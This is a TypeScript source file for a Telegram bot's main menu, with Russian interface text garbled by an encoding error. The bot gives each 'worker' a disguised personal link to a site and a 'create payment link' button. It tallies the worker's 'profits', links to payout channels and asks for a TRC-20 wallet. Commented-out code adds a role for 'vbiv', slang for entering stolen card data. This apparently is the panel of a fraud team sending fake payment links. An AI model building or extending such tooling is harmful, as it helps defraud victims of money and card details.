import {Context} from "@/database/models/context";
import {Composer, InlineKeyboard} from "grammy";
import {profitRepository, settingsRepository} from "@/database";
import {User, UserRole} from "@/database/models/user";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import console from "console";
import { config } from "@/utils/config";

const moment = require('moment');

export const composer = new Composer<Context>()
composer.command('start', handlerMenu)
composer.callbackQuery('menu', callbackHandler)
composer.callbackQuery('menuWithPicture', handlerMenu)
composer.callbackQuery('menuNewMessage', callbackHandler2)
// composer.callbackQuery('private in dev', calloback)

const howMuchMoney = async (ctx: Context) => {
    const data = await profitRepository.find({
        relations: {
            worker: true
        },
        where: {
            worker: {
                tgId: ctx.from.id
            }
        }
    })
    let usd = 0

    for (const obj of data) {
        usd += obj.workerValue
    }

    return usd
}

function keyb(user: User) {
    const keyboard = new InlineKeyboard()
        // .text(`EMAIL`, 'private menu lonelypups')
        // .row()
        .text(`–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –æ–ø–ª–∞—Ç—É`, 'create payment link')
        // .text(`üë®‚Äçüéì –ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏`, 'mentors')
        // .text(`üíª –í—ã–±—Ä–∞—Ç—å –¢–ü`, 'support')
        // .row()
        // .text(`${(user.trcAddress) ? '–°–º–µ–Ω–∏—Ç—å' : '–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å'} TRC-20`, 'setTether')
        // .row()
        // .text(`–ù–∞—Å—Ç—Ä–æ–∏—Ç—å –¢–≠–ì`, 'tag')
        .row()
        .url(`üí¨ –ß–ê–¢`, 'https://t.me/+BheXxUhEqyIxZDli')
        .url(`üí∏ –í–´–ü–õ–ê–¢–´`, 'https://t.me/+7ixewdC1v6kwNjUy')

        // .text(`‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏`, 'settings')
        // .text(`üó≥ –ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ`, 'useful')

    // if (user.admin) {
    //     keyboard.row()
    //     keyboard.text('üïπ –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å', 'admin menu')
    // }

    // if (!user.naVbive && user.role === UserRole.VBIVER) {
    //     keyboard.row()
    //     keyboard.text('üåö –í—Å—Ç–∞—Ç—å –Ω–∞ –≤–±–∏–≤!', 'user set vbiv true')
    // }
    //
    // if (user.naVbive && user.role === UserRole.VBIVER) {
    //     keyboard.row()
    //     keyboard.text('üêæ –£–π—Ç–∏ —Å–æ –≤–±–∏–≤–∞!', 'user set vbiv false')
    // }

    return keyboard
}



function shuffleId(num: number): number {
    let numStr = num.toString();
    const permutationPattern = [[0,5],[2, 1],[6,3],[4,3],[6,3], [4, 2], [3, 5]];
    let digits = numStr.split('');

    permutationPattern.forEach(pair => {
        const [firstIndex, secondIndex] = pair;

        if (firstIndex < digits.length && secondIndex < digits.length) {
            const temp = digits[firstIndex];
            digits[firstIndex] = digits[secondIndex];
            digits[secondIndex] = temp;
        }
    });

    return parseInt(digits.join(''), 10);
}

function unshuffleId(num: number): number {
    let numStr = num.toString();
    let digits = numStr.split('');
    const permutationPattern = [[0,5],[2, 1],[6,3],[4,3],[6,3], [4, 2], [3, 5]];
   
    // –î–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏ –Ω—É–∂–Ω–æ –ø—Ä–∏–º–µ–Ω–∏—Ç—å –ø–µ—Ä–µ—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ –æ–±—Ä–∞—Ç–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
    for (let i = permutationPattern.length - 1; i >= 0; i--) {
        const [firstIndex, secondIndex] = permutationPattern[i];

        // –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ–±—ã –∏–Ω–¥–µ–∫—Å—ã –±—ã–ª–∏ –≤ –ø—Ä–µ–¥–µ–ª–∞—Ö –¥–ª–∏–Ω—ã —á–∏—Å–ª–∞
        if (firstIndex < digits.length && secondIndex < digits.length) {
            const temp = digits[firstIndex];
            digits[firstIndex] = digits[secondIndex];
            digits[secondIndex] = temp;
        }
    }

    return parseInt(digits.join(''), 10);
}
const text = async (ctx: Context) => {
    const settings = await settingsRepository.findOne({where: {id: 1}})

    let timeTeam = null
    if (ctx.user.created) {
        const createDate = moment(ctx.user.created);
        const currentDate = moment();

        const timeDifference = moment.duration(currentDate.diff(createDate));
        timeTeam = timeDifference.humanize()
    }
// <b>ü™™ ID:</b> <code>${ctx.user.tgId}</code>
// <b>üè∑ TAG:</b> <code>${ctx.user.tag}</code>
// <b>üìà –ü—Ä–æ—Ü–µ–Ω—Ç:</b> <code>${(ctx.user.isPro) ? settings.proPercent + '% [PRO]' : settings.percent + '%'}</code>
// <b>üíµ –ü—Ä–æ—Ñ–∏—Ç–æ–≤ –Ω–∞ —Å—É–º–º—É:</b> <code>${await howMuchMoney(ctx)} USD</code>

//<b>ü§ñ –°—Ç–∞—Ç—É—Å –ø—Ä–æ–µ–∫—Ç–∞:</b> <code>${(settings.work) ? 'üíö FULL WORK' : 'üõë STOP WORK'}</code>-->

//<b>üíå –ï—Å—Ç—å –∫–∞–∫–∏–µ-—Ç–æ –≤–æ–ø—Ä–æ—Å—ã?:</b>-->
//<b><a href="tg://user?id=6424732174">–¢–°</a></b> –∏–ª–∏ <b><a href="tg://user?id=6514725512">–¢–°</a></b>-->
// <!--<b>üîê –¢–µ—Ö. –ø—Ä–æ–±–ª–µ–º—ã: <a href="tg://user?id=6452070203">–ö–û–î–ï–†</a></b>-->
    return `
üß∏ <b>–ü—Ä–∏–≤–µ—Ç, <a href="tg://user?id=${ctx.from.id}">${ctx.from.first_name}</a></b>
${(timeTeam) ? 'üìÖ <b>–¢—ã —Å –Ω–∞–º–∏ —É–∂–µ:</b> <code>' + timeTeam + '</code> ' : ''}
üîó <b>–¢–≤–æ—è –ª–∏—á–Ω–∞—è —Å—Å—ã–ª–∫–∞: ${config.site.url}?s=${shuffleId(ctx.from.id)}</b>
`.replace('\n', '')
}

export async function handlerMenu(ctx: Context)  {
    await ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption: await text(ctx),
        reply_markup: keyb(ctx.user)
    })
    // if (!ctx.user.trcAddress) {
    //     await ctx.reply(`‚ö†Ô∏è –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω TRC-20 –∫–æ—à–µ–ª–µ–∫ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö!`, {
    //         reply_markup: {
    //             inline_keyboard: [
    //                 [{text: '–ó–∞–∫—Ä—ã—Ç—å', callback_data: 'deleteThisMessage'}]
    //             ]
    //         }
    //     })
    // }
}


async function callbackHandler(ctx: Context)  {
    return ctx.editMessageCaption({
        caption: await text(ctx),
        reply_markup: keyb(ctx.user)
    })
}

async function calloback(ctx: Context)  {
    return ctx.answerCallbackQuery({
        text: 'üß∏ –í –†–ê–ó–†–ê–ë–û–¢–ö–ï',
        show_alert: true
    })
}

export async function callbackHandler2(ctx: Context)  {
    try {
        await ctx.deleteMessage()
    }catch (e) {}

    await ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption: await text(ctx),
        reply_markup: keyb(ctx.user)
    })

    if (!ctx.user.trcAddress) {
        await ctx.reply(`‚ö†Ô∏è –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω TRC-20 –∫–æ—à–µ–ª–µ–∫ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö!`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: '–ó–∞–∫—Ä—ã—Ç—å', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
    }
}